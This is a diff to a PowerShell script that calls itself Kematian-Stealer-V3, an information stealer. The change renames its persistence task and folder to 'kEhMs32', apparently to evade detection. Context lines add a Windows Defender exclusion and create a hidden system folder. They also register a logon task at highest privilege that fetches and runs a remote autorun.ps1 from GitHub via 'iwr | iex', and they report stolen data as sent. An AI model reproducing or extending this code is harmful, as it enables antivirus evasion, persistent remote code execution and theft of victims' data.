@@ -78,7 +78,7 @@ function Invoke-TASKS {
         Add-MpPreference -ExclusionPath "$env:APPDATA\kEhMs32" -Force
         $KDOT_DIR = New-Item -ItemType Directory -Path "$env:APPDATA\kEhMs32" -Force
         $KDOT_DIR.Attributes = "Hidden", "System"
-        $task_name = "Kematian"
+        $task_name = "kEhMs32"
         $task_action = if ($debug) {
             New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/kcock25/Kematian-Stealer-V3/main/frontend-src/autorun.ps1 | iex`""
         }
@@ -87,7 +87,7 @@ function Invoke-TASKS {
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
+        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "kEhMs32" -RunLevel Highest -Force | Out-Null
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
@@ -1177,7 +1177,7 @@ function Backup-Data {
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
 
     # cleanup
-    Remove-Item "$env:appdata\Kematian" -Force -Recurse
+    Remove-Item "$env:appdata\kEhMs32" -Force -Recurse
 }
 
 if (CHECK_AND_PATCH -eq $true) {
